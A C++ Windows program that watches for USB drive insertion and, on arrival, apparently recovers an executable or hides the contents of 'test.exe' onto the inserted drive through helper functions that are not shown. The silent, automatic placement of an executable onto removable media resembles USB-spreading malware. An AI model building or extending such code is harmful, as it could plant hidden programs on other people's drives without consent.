#include "stdafx.h"
#include <windows.h>
#include <dbt.h>
#include <stdio.h>
#include <math.h>
#include "Udevice.h"

LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM wp, LPARAM lp)
{
	if (msg == WM_DEVICECHANGE) {
		if ((DWORD)wp == DBT_DEVICEARRIVAL) {
			DEV_BROADCAST_VOLUME* p = (DEV_BROADCAST_VOLUME*)lp;
			if (p->dbcv_devicetype == DBT_DEVTYP_VOLUME) {
				int l = (int)(log(double(p->dbcv_unitmask)) / log(double(2)));	//根据驱动器掩码计算驱动器号相对A的偏移量，精华
				printf("啊……%c盘插进来了\n", 'A' + l);
				char *file = (char *)"C:/test.exe";

				bool a = Recovery('A' + l,file);
				DWORD b = GetLastError();
				if (!a&&!b) {
					file = (char *)"E:/test.exe";
					char *buffer = Read(file);
					Hide('A' + l, buffer);
				}
				
				
				//TODO:对u盘进行操作
				printf("%d\n", b);
			}
		}
		else if ((DWORD)wp == DBT_DEVICEREMOVECOMPLETE) {
			DEV_BROADCAST_VOLUME* p = (DEV_BROADCAST_VOLUME*)lp;
			if (p->dbcv_devicetype == DBT_DEVTYP_VOLUME) {
				int l = (int)(log(double(p->dbcv_unitmask)) / log(double(2)));
				printf("啊……%c盘被拔掉了\n", 'A' + l);
			}
		}
		return TRUE;
	}
	else return DefWindowProc(h, msg, wp, lp);
}
int main() {
	WNDCLASS wc;
	ZeroMemory(&wc, sizeof(wc));
	wc.lpszClassName = TEXT("myusbmsg");
	wc.lpfnWndProc = WndProc;

	RegisterClass(&wc);
	HWND h = CreateWindow(TEXT("myusbmsg"), TEXT(""), 0, 0, 0, 0, 0,
		0, 0, GetModuleHandle(0), 0);
	MSG msg;
	while (GetMessage(&msg, 0, 0, 0) > 0) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}